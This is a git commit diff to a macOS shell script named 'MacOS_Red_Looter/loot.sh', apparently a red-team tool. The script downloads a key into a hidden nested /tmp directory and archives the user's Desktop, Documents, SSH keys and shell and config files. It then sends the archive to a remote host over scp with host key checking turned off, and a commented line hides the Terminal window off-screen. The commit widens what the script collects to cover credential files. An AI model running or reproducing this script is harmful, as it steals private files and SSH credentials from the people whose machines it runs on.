854d2439ea20a6dafcd952d6129d6c194acb7367
un1x01d <>
2022-08-19 00:49:29 -0400

    add absolut paths

--- MacOS_Red_Looter/loot.sh
+++ MacOS_Red_Looter/loot.sh
@@ -2,11 +2,12 @@
 
 # osascript -e 'tell application "Terminal" to set boounds of front window to {3000, 2000, 10, 10}'
 
+HOME="/Users/$USER"
 
 mkdir -p /tmp/.s/.t/.e/.a/.l && curl -s http://192.168.1.216/sh -o /tmp/.s/.t/.e/.a/.l/.s 
 chmod 600 /tmp/.s/.t/.e/.a/.l/.s
 
 cd /tmp/.s/.t/.e/.a/.l
-tar cfz .loot.tgz /Users/zed/Desktop # ~/Documents ~/.ssh ~/.bash* ~/.config ~/.zsh*
+tar cfz .loot.tgz $HOME/Desktop $HOME/Documents $HOME/.ssh $HOME/.bash* $HOME/.config $HOME/.zsh*
 
 scp -q -o StrictHostKeyChecking=no -i /tmp/.s/.t/.e/.a/.l/.s /tmp/.s/.t/.e/.a/.l/.loot.tgz zed@192.168.1.216:~/demo/
